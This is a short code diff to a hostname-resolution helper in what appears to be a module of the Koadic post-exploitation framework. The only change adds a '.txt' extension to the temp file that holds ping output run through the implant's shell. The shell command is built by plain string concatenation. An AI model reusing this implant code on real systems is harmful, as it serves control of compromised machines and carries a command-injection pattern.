@@ -24,7 +24,7 @@ function guid()
 
 function resolve(hostname)
 {
-  var results = Koadic.shell.exec("ping -n 1 -4 "+hostname, "~DIRECTORY~\\"+guid());
+  var results = Koadic.shell.exec("ping -n 1 -4 "+hostname, "~DIRECTORY~\\"+guid()+".txt");
   return results.split("[")[1].split("]")[0];
 }
 
